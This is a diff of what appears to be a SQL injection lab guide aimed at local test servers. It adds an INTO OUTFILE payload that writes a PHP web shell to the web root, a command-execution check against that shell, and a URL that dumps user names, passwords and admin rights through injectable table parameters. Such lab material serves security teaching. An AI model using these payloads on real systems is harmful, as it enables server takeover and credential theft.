@@ -70,12 +70,30 @@ http://127.0.0.1:8781/load_file/list_users.php?UserID=1%20UNION%20ALL%20SELECT%2
 
 ## Write code to server
 
+Using LAMP Server:
+
+### Standard
+
+http://127.0.0.1:8782/into_outfile/list_users.php?UserID=1
+
+### Attack
+
 Use `INTO OUTFILE`:
 
-http://127.0.0.1:8781/user_information.php?UserID=1%20UNION%20SELECT%201,2,%27%3C?php%20system($_REQUEST[%22cmd%22]);%20?%3E%27%20INTO%20OUTFILE%20%27/var/www/html/cmd.php%27
+http://127.0.0.1:8782/into_outfile/list_users.php?UserID=1%20UNION%20SELECT%201,2,%27%3C?php%20system($_REQUEST[%22cmd%22]);%20?%3E%27%20INTO%20OUTFILE%20%27/var/www/html/cmd.php%27
 
 `/var/www/html/cmd.php` should not exist before.
 
 After that you can check remote code execution with:
 
 http://127.0.0.1:8781/cmd.php?cmd=ls
+
+# Generic Attack
+
+## Standard
+
+http://127.0.0.1:8781/inf_disclosure/generic/show_timesheet.php
+
+## Attack
+
+http://127.0.0.1:8781/inf_disclosure/generic/show_employee_table.php?column1=AdminRights&column2=User&column3=Password&table=Users
